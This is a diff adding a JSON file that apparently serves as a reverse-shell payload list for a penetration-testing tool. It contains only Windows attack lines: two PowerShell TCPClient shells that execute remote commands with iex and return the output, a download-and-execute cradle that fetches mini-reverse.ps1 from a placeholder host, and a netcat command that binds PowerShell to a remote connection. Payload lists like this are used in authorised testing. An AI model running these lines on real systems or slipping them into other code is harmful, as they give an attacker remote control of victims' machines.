@@ -1,0 +1,19 @@
+{
+    "powershell" : [
+        {
+            "reverse" : "New-Object System.Net.Sockets.TCPClient(\"<IP>\",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        },
+        {
+            "reverse" : "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        },
+        {
+            "description" : "Download and execute mini-reverse.ps1 from http://<IP>:9001/mini-reverse.ps1 \nCheck on https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell",
+            "reverse" : "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:9001/mini-reverse.ps1')"
+        }
+    ],
+    "netcat" : [
+        {
+            "reverse" : "C:\\Temp\\nc64.exe <IP> <PORT> -e powershell"
+        }
+    ]
+}
